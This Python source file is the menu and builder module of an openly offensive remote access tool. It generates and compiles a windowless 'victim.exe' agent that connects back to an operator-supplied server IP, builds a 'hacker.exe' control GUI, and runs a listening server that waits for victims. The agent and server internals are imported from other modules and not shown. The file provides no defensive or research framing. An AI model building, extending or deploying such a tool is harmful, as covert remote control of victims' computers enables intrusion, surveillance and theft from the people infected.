
import asyncio
import os
import sys
import json

from core.display import C, type_line, SEPARATOR, print_banner
from core.platform_utils import clear_screen
from cli.prompts import safe_input, press_enter


def option_rat():
    clear_screen()
    print_banner()
    type_line(f"  {C.DK_MAG}{C.BOLD}REMOTE ACCESS TOOL{C.RESET}", delay=0.02)
    print(SEPARATOR)
    print()
    print(f"  {C.GRAY}Build and manage remote access agents{C.RESET}")
    print()
    print(f"  {C.DK_CYN}[1]{C.RESET} Build victim.exe")
    print(f"  {C.DK_CYN}[2]{C.RESET} Build hacker.exe (GUI)")
    print(f"  {C.DK_CYN}[3]{C.RESET} Run hacker server (GUI)")
    print()

    choice = safe_input(f"{C.GRAY}Choice: {C.RESET}").strip()

    if choice == "1":
        _build_victim()
    elif choice == "2":
        _build_hacker()
    elif choice == "3":
        _run_hacker_server()
    else:
        type_line(f"  {C.DK_RED}Invalid choice.{C.RESET}")
        press_enter()


def _build_victim():
    server_ip = safe_input(f"{C.GRAY}Server IP to connect to: {C.RESET}").strip()
    if not server_ip:
        type_line(f"  {C.DK_RED}No IP provided.{C.RESET}")
        press_enter()
        return

    port_str = safe_input(f"{C.GRAY}Server port (default 5555): {C.RESET}").strip()
    port = int(port_str) if port_str.isdigit() else 5555

    password = safe_input(f"{C.GRAY}Auth password (optional): {C.RESET}").strip()

    output_name = safe_input(f"{C.GRAY}Output filename (default: victim): {C.RESET}").strip()
    if not output_name:
        output_name = "victim"
    if not output_name.endswith(".exe"):
        output_name += ".exe"

    type_line(f"\n  {C.GRAY}Building {output_name}...{C.RESET}")

    script = _generate_victim_script(server_ip, port, password)
    script_name = output_name.replace(".exe", "_agent.py")
    script_path = script_name
    with open(script_path, "w", encoding="utf-8") as f:
        f.write(script)

    exe_name = output_name.replace(".exe", "")

    try:
        import PyInstaller.__main__
        PyInstaller.__main__.run([
            script_path,
            "--onefile",
            "--windowed",
            "--name", exe_name,
            "--clean",
        ])
        type_line(f"  {C.DK_CYN}{output_name} created in dist/{C.RESET}")
    except ImportError:
        type_line(f"  {C.DK_RED}PyInstaller not installed. Install with: pip install pyinstaller{C.RESET}")
        type_line(f"  {C.GRAY}Script saved to {script_path} - run manually with: python {script_path}{C.RESET}")
    except Exception as e:
        type_line(f"  {C.DK_RED}Build failed: {e}{C.RESET}")

    press_enter()


def _build_hacker():
    port_str = safe_input(f"{C.GRAY}Listening port (default 5555): {C.RESET}").strip()
    port = int(port_str) if port_str.isdigit() else 5555

    password = safe_input(f"{C.GRAY}Auth password (optional): {C.RESET}").strip()

    output_name = safe_input(f"{C.GRAY}Output filename (default: hacker): {C.RESET}").strip()
    if not output_name:
        output_name = "hacker"
    if not output_name.endswith(".exe"):
        output_name += ".exe"

    type_line(f"\n  {C.GRAY}Building {output_name}...{C.RESET}")

    script = _generate_hacker_script(port, password)
    script_name = output_name.replace(".exe", "_control.py")
    script_path = script_name
    with open(script_path, "w", encoding="utf-8") as f:
        f.write(script)

    exe_name = output_name.replace(".exe", "")

    try:
        import PyInstaller.__main__
        PyInstaller.__main__.run([
            script_path,
            "--onefile",
            "--windowed",
            "--name", exe_name,
            "--clean",
        ])
        type_line(f"  {C.DK_CYN}{output_name} created in dist/{C.RESET}")
    except ImportError:
        type_line(f"  {C.DK_RED}PyInstaller not installed. Install with: pip install pyinstaller{C.RESET}")
        type_line(f"  {C.GRAY}Script saved to {script_path} - run manually with: python {script_path}{C.RESET}")
    except Exception as e:
        type_line(f"  {C.DK_RED}Build failed: {e}{C.RESET}")

    press_enter()


def _run_hacker_server():
    port_str = safe_input(f"{C.GRAY}Listening port (default 5555): {C.RESET}").strip()
    port = int(port_str) if port_str.isdigit() else 5555

    password = safe_input(f"{C.GRAY}Auth password (optional): {C.RESET}").strip()

    type_line(f"\n  {C.GRAY}Starting hacker server on port {port}...{C.RESET}\n")

    from features.rat.hacker_server import HackerServer
    from features.rat.hacker_gui import HackerGUI

    server = HackerServer(port=port, password=password)
    server.start()

    try:
        gui = HackerGUI(server)
        type_line(f"  {C.DK_CYN}GUI started. Waiting for victims...{C.RESET}")
        gui.run()
    except ImportError:
        type_line(f"  {C.DK_RED}GUI dependencies missing (customtkinter, Pillow){C.RESET}")
        type_line(f"  {C.GRAY}Running in headless mode. Press Ctrl+C to stop.{C.RESET}")
        try:
            while True:
                import time
                time.sleep(1)
        except KeyboardInterrupt:
            pass
    finally:
        server.stop()


def _generate_victim_script(server_ip: str, port: int, password: str) -> str:
    return f'''import sys
import os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from features.rat.victim import VictimClient

def main():
    client = VictimClient(
        server_host="{server_ip}",
        server_port={port},
        password="{password}",
    )
    if client.connect():
        client.run()
    else:
        sys.exit(1)

if __name__ == "__main__":
    main()
'''


def _generate_hacker_script(port: int, password: str) -> str:
    return f'''import sys
import os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from features.rat.hacker_server import HackerServer
from features.rat.hacker_gui import HackerGUI

def main():
    server = HackerServer(port={port}, password="{password}")
    server.start()
    gui = HackerGUI(server)
    gui.run()
    server.stop()

if __name__ == "__main__":
    main()
'''
